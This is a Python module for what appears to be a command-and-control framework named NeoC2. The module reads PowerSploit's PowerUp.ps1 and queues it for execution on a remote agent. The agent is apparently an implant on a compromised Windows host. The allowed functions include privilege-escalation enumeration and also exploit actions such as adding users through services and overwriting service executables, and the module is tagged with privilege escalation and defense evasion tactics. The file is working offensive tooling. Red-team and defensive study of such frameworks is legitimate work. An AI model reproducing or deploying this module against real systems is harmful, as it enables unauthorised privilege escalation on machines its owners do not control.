# modules/PowerUp.py
import os
import importlib.util
import base64
import re

def get_info():
    """Get module information"""
    return {
        "name": "PowerUp",
        "description": "Execute a PowerShell PowerUp script for Windows privilege escalation enumeration",
        "type": "privesc",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1546,T1548,T1068,T1059.001",  # Event Triggered Execution, Abuse Elevation Control Mechanism, Exploitation for Privilege Escalation, Command and Scripting Interpreter: PowerShell
        "mitre_tactics": ["Privilege Escalation", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run PowerUp enumeration on",
                "required": True
            },
            "function": {
                "description": "The PowerUp function to execute (default: 'Invoke-AllChecks'). Available functions include privilege escalation checks: AllChecks, Get-ServicePerms, Get-ModifiableServiceFile, Get-ModifiableService, Get-UnquotedService, Get-VulnAutoRun, Get-VulnDCOM, Get-VulnSchTask, Get-RegistryAlwaysInstallElevated, Get-RegistryAutoLogon, Get-ModifiablePath, Get-ProcessTokenGroup, Invoke-AllChecks, Write-UserAddService, Write-ServiceEXE, Write-UserAddCommand, Write-ServicePowerShellCommand",
                "required": False,
                "default": "Invoke-AllChecks"
            },
            "arguments": {
                "description": "Additional arguments to pass to the PowerUp function (optional)",
                "required": False,
                "default": ""
            },

        }
    }


def execute(options, session):
    """Execute the PowerUp module with given options and session"""
    agent_id = options.get("agent_id")
    function = options.get("function", "Invoke-AllChecks")
    arguments = options.get("arguments", "")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    allowed_functions = [
        "AllChecks", "Get-ServicePerms", "Get-ModifiableServiceFile", "Get-ModifiableService", 
        "Get-UnquotedService", "Get-VulnAutoRun", "Get-VulnDCOM", "Get-VulnSchTask", 
        "Get-RegistryAlwaysInstallElevated", "Get-RegistryAutoLogon", "Get-ModifiablePath", 
        "Get-ProcessTokenGroup", "Invoke-AllChecks", "Write-UserAddService", "Write-ServiceEXE", 
        "Write-UserAddCommand", "Write-ServicePowerShellCommand"
    ]
    
    if function not in allowed_functions:
        return {
            "success": False,
            "error": f"Invalid function: {function}. Must be one of: {', '.join(allowed_functions)}"
        }
    
    # Validate arguments for potential command injection
    # Only allow alphanumeric characters, spaces, and common PowerShell parameter characters
    if arguments and not re.match(r'^[a-zA-Z0-9.\-_=:, \\\\/"\']+$', arguments):
        return {
            "success": False,
            "error": f"Invalid arguments: {arguments}. Contains invalid characters."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    

    
    # Read the original PowerUp.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'PowerUp.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find PowerUp script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading PowerUp script: {str(e)}"
        }
    
    # Build the execution command with parameters based on the function
    if arguments:
        execution_command = f"{original_script}\n{function} {arguments}"
    else:
        execution_command = f"{original_script}\n{function}"
    
    # Return the execution command - the agent will handle PowerShell execution and base64 encoding
    powershell_command = execution_command
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"PowerUp task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "function": function,
                "arguments": arguments
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }